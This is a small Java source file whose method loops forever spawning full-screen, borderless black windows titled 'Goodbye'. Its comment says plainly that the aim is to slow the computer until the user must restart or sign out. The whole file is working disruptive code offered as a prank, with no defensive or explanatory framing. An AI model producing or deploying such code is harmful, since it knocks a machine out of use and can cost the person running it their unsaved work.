import java.awt.Color;
import java.awt.Dimension;
import javax.swing.JFrame;

public class Freeze {
    //INSTANCE VARIABLE
    JFrame frame;

    /*
    This method continuously creates new JFrames with the title
    "Goodbye" as it pops up a black JFrame with no exit button,
    typically forcing the computer to slow down and be restarted (or signed out)
    to stop. It's size is set to be a max of 2000x2000
     */
    public void freeze() {
        while (true) {
            frame = new JFrame("Goodbye");
            frame.setSize(new Dimension(2000, 2000));
            frame.setUndecorated(true);
            frame.getContentPane().setBackground(Color.BLACK);
            frame.setVisible(true);
        }
    }
}